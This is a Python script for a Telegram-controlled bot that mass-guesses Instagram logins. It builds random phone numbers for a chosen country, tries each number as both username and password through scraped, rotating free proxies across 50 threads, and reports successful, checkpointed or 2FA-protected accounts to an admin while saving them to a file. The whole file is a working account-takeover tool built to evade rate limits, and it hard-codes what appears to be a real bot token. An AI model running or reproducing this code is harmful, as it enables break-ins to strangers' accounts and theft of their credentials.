# ultimate_hunter.py - v4.1 (Corrected Event Loop Initialization)

import requests
from bs4 import BeautifulSoup
import threading
import queue
import time
import random
from datetime import datetime
import asyncio
from telegram import Update
from telegram.ext import (
    Application, CommandHandler, ContextTypes, MessageHandler, filters, ConversationHandler
)

# ==============================================================================
# SECTION 0: CONFIGURATION
# ==============================================================================

TELEGRAM_BOT_TOKEN = "1936058114:AAHm19u1R6lv_vShGio-MIo4Z0rjVUoew_U" # ⚠️ استبدل بالتوكن الخاص بك
ADMIN_USER_ID = 1148797883 # ⚠️ استبدل بالـ ID الخاص بك

# --- قائمة الدول ذات الأولوية (قابلة للتعديل) ---
SUPPORTED_COUNTRIES = {
    "🇸🇦 Saudi Arabia": "966", "🇪🇬 Egypt": "20", "🇩🇪 Germany": "49", "🇫🇷 France": "33",
    "🇮🇷 Iran": "98", "🇱🇾 Libya": "218", "🇰🇼 Kuwait": "965", "🇦🇪 UAE": "971",
    "🇮🇶 Iraq": "964", "🇺🇸 USA": "1", "🇬🇧 UK": "44", "🇹🇷 Turkey": "90"
}

HITS_FILE = "hits.txt"
MAX_HUNTING_THREADS = 50

# --- متغيرات الحالة العامة ---
is_hunting = False
hunt_task = None
hunt_stats = {
    "processed": 0, "total_targets": 0, "hits": 0, "start_time": None,
    "current_phase": "Idle", "country_code": "", "live_proxies": 0
}
# --- مخزون البروكسيات ---
proxy_inventory = queue.Queue()

# --- حالات المحادثة ---
SELECTING_COUNTRY = 1

# ==============================================================================
# SECTION 1: PROXY MANAGEMENT SYSTEM (The Workers)
# ==============================================================================

def _proxy_checker(q_in, q_out):
    """Worker: Takes a proxy from the input queue, checks it, and puts it in the output queue if it's live."""
    while True:
        proxy = q_in.get()
        try:
            # استخدام httpbin.org لأنه موثوق ومصمم لهذه الاختبارات
            requests.get("https://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=7)
            q_out.put(proxy)
        except Exception:
            pass # تجاهل البروكسي الفاشل
        q_in.task_done()

async def _proxy_harvester(bot):
    """Manager: Continuously scrapes and checks proxies to keep the inventory full."""
    global proxy_inventory
    while True:
        if proxy_inventory.qsize() < 50: # إذا انخفض المخزون عن 50، ابدأ إعادة التعبئة
            try:
                await bot.send_message(chat_id=ADMIN_USER_ID, text=f"🏭 Proxy inventory low ({proxy_inventory.qsize()}). Starting harvester workers...")
                
                unchecked_proxies = queue.Queue()
                # Scrape from free-proxy-list.net
                response = await asyncio.to_thread(requests.get, "https://free-proxy-list.net/", timeout=15)
                soup = BeautifulSoup(response.content, 'html.parser')
                for row in soup.find("table", class_="table-striped").tbody.find_all("tr"):
                    ip, port, _, _, _, _, is_https, _ = [td.string for td in row.find_all("td")]
                    if is_https == 'yes':
                        unchecked_proxies.put(f"http://{ip}:{port}")
                
                # Start checker workers
                for _ in range(100): # 100 عامل فحص
                    threading.Thread(target=_proxy_checker, args=(unchecked_proxies, proxy_inventory), daemon=True).start()
                
                await bot.send_message(chat_id=ADMIN_USER_ID, text=f"👷‍♂️ Harvester deployed. Workers are now filling the inventory.")
            except Exception as e:
                print(f"Harvester Error: {e}")
        
        hunt_stats["live_proxies"] = proxy_inventory.qsize()
        await asyncio.sleep(60) # تحقق من المخزون كل دقيقة

# ==============================================================================
# SECTION 2: CORE HUNTING LOGIC
# ==============================================================================

def _instagram_worker(target_q, bot_token):
    """Worker: Takes a target, gets a proxy, and attempts to log in."""
    global hunt_stats
    while True:
        username, password = target_q.get()
        
        try:
            proxy = proxy_inventory.get(timeout=10) # اسحب بروكسي من المخزون
        except queue.Empty:
            target_q.task_done()
            continue # لا توجد بروكسيات، تجاهل هذا الهدف

        try:
            login_url = 'https://www.instagram.com/accounts/login/ajax/'
            headers = {"User-Agent": "Mozilla/5.0", "X-Requested-With": "XMLHttpRequest", "Referer": "https://www.instagram.com/accounts/login/"}
            proxies_dict = {"http": proxy, "https": proxy}
            with requests.Session() as s:
                r = s.get("https://www.instagram.com/accounts/login/", proxies=proxies_dict, timeout=10)
                csrf = r.cookies.get('csrftoken')
                if not csrf: raise Exception("Failed to get CSRF token")
                headers['x-csrftoken'] = csrf
                payload = {'username': username, 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{int(datetime.now().timestamp())}:{password}'}
                login_r = s.post(login_url, data=payload, headers=headers, proxies=proxies_dict, timeout=10)
                
                if login_r.status_code == 200:
                    data = login_r.json()
                    status = "FAIL"
                    if data.get("authenticated"): status = "SUCCESS"
                    elif "checkpoint_url" in login_r.text: status = "CHECKPOINT"
                    elif data.get("two_factor_required"): status = "2FA"
                    
                    if status != "FAIL":
                        hunt_stats["hits"] += 1
                        # استخدام asyncio.run لإرسال الإشعار من داخل thread
                        asyncio.run(send_hit_notification(status, username, password, bot_token))
                    
                    # إذا لم تكن كلمة المرور صحيحة، فالبروكسي صالح
                    proxy_inventory.put(proxy)
                else:
                    # البروكسي محروق على الأغلب، لا تعيده للمخزون
                    pass
        except Exception:
            # أي خطأ آخر يعني أن البروكسي محروق على الأغلب
            pass
        finally:
            hunt_stats["processed"] += 1
            target_q.task_done()

async def the_hunt(context: ContextTypes.DEFAULT_TYPE, country_code: str):
    """Manager: Starts and manages the hunting process for a specific country."""
    global is_hunting, hunt_stats
    is_hunting = True
    
    hunt_stats.update({
        "processed": 0, "total_targets": 0, "hits": 0, "start_time": time.time(),
        "current_phase": "Hunting", "country_code": country_code
    })

    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🎯 **Hunt started for country code: +{country_code}**")
    
    target_queue = queue.Queue()
    
    num_targets = 5000 
    for _ in range(num_targets):
        random_part = ''.join(random.choice('0123456789') for _ in range(random.randint(7, 9)))
        target_queue.put((f"{country_code}{random_part}", f"{country_code}{random_part}"))
    
    hunt_stats["total_targets"] = num_targets
    await context.bot.send_message(chat_id=ADMIN_USER_ID, text=f"🔥 Generated {num_targets} targets. Deploying hunter workers...")

    # تشغيل عمال الصيد
    for _ in range(MAX_HUNTING_THREADS):
        threading.Thread(target=_instagram_worker, args=(target_queue, context.bot.token), daemon=True).start()

    target_queue.join() # انتظر حتى يتم فحص كل الأهداف

    await context.bot.send_message(chat_id=ADMIN_USER_ID, text="✅ **Hunt Finished!**\nAll targets have been attempted.")
    is_hunting = False
    hunt_stats["current_phase"] = "Finished"

# ==============================================================================
# SECTION 3: TELEGRAM HANDLERS & CONVERSATION
# ==============================================================================

class AdminFilter(filters.BaseFilter):
    def filter(self, message: Update): return message.from_user.id == ADMIN_USER_ID
admin_filter = AdminFilter()

async def send_hit_notification(status, username, password, bot_token):
    """Sends a formatted hit notification to the admin."""
    bot = Application.builder().token(bot_token).build().bot
    result_message = f"🎯 *HIT FOUND!* ({hunt_stats['hits']}) 🎯\n\n*Status:* `{status}`\n*Username:* `{username}`\n*Password:* `{password}`"
    await bot.send_message(chat_id=ADMIN_USER_ID, text=result_message, parse_mode='Markdown')
    with open(HITS_FILE, "a") as f:
        f.write(f"{username}:{password} | Status: {status}\n")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "👋 **Welcome to the Ultimate Hunter Bot v4.1!**\n\n"
        "▶️ `/hunt` - Start a new hunt.\n"
        "🛑 `/stophunt` - Stop the current hunt.\n"
        "📊 `/status` - Get a live progress report."
    , parse_mode='Markdown')

async def hunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if is_hunting:
        await update.message.reply_text("⚠️ A hunt is already in progress.")
        return ConversationHandler.END
    country_list_text = "\n".join([f"`{code}` - {name}" for name, code in SUPPORTED_COUNTRIES.items()])
    await update.message.reply_text(f"🌍 **Select a Country** 🌍\n\n{country_list_text}", parse_mode='Markdown')
    return SELECTING_COUNTRY

async def received_country_code(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global hunt_task
    country_code = update.message.text.strip()
    if not country_code.isdigit():
        await update.message.reply_text("❌ Invalid input. Please send numbers only.")
        return SELECTING_COUNTRY
    await update.message.reply_text(f"🚀 **Command received!** Starting hunt for `+{country_code}`.", parse_mode='Markdown')
    hunt_task = asyncio.create_task(the_hunt(context, country_code))
    return ConversationHandler.END

async def stophunt_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_hunting, hunt_task
    if not is_hunting:
        await update.message.reply_text("ℹ️ No hunt is currently running.")
        return
    is_hunting = False
    if hunt_task: hunt_task.cancel()
    await update.message.reply_text("⏳ **Stopping...** The hunt will be terminated shortly.")

async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_hunting and hunt_stats["current_phase"] == "Idle":
        await update.message.reply_text(f"🅾️ **Status:** The bot is idle.\nLive Proxies in Stock: `{proxy_inventory.qsize()}`")
        return
    
    percentage = (hunt_stats["processed"] / hunt_stats["total_targets"] * 100) if hunt_stats["total_targets"] > 0 else 0
    elapsed_time = time.strftime("%H:%M:%S", time.gmtime(time.time() - hunt_stats["start_time"])) if hunt_stats["start_time"] else "N/A"
    
    status_message = (
        f"📊 **Live Hunt Status** 📊\n\n"
        f"▪️ **Country Code:** `+{hunt_stats['country_code']}`\n"
        f"▪️ **Phase:** `{hunt_stats['current_phase']}`\n"
        f"▪️ **Progress:** {hunt_stats['processed']} / {hunt_stats['total_targets']} checked.\n"
        f"▪️ **Completion:** `{percentage:.2f}%`\n"
        f"▪️ **Successful Hits:** `{hunt_stats['hits']}`\n"
        f"▪️ **Live Proxies in Stock:** `{proxy_inventory.qsize()}`\n"
        f"▪️ **Time Elapsed:** `{elapsed_time}`"
    )
    await update.message.reply_text(status_message, parse_mode='Markdown')

async def cancel_conversation(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Hunt selection cancelled.")
    return ConversationHandler.END

# ==============================================================================
# SECTION 4: MAIN APPLICATION (Corrected)
# ==============================================================================

async def post_init(application: Application):
    """A function to run after the bot is initialized, to start background tasks."""
    await application.bot.send_message(
        chat_id=ADMIN_USER_ID,
        text="✅ **Bot Online & Ready!**\n\n🏭 Proxy harvester workers are now active in the background. Use `/hunt` to start."
    )
    # تشغيل جامع البروكسيات كمهمة خلفية
    asyncio.create_task(_proxy_harvester(application.bot))

def main():
    """The main entry point for the bot."""
    print("--- ULTIMATE HUNTER BOT v4.1 is starting... ---")
    
    # إعداد التطبيق
    application = Application.builder().token(TELEGRAM_BOT_TOKEN).post_init(post_init).build()
    
    # --- إعداد محادثة الصيد ---
    hunt_conv_handler = ConversationHandler(
        entry_points=[CommandHandler("hunt", hunt_command, filters=admin_filter)],
        states={SELECTING_COUNTRY: [MessageHandler(filters.TEXT & ~filters.COMMAND & admin_filter, received_country_code)]},
        fallbacks=[CommandHandler("cancel", cancel_conversation)]
    )
    
    # إضافة كل معالجات الأوامر
    application.add_handler(hunt_conv_handler)
    application.add_handler(CommandHandler("start", start_command, filters=admin_filter))
    application.add_handler(CommandHandler("stophunt", stophunt_command, filters=admin_filter))
    application.add_handler(CommandHandler("status", status_command, filters=admin_filter))
    
    # تشغيل البوت
    print("Bot is now listening for commands on Telegram.")
    application.run_polling()

if __name__ == "__main__":
    main()
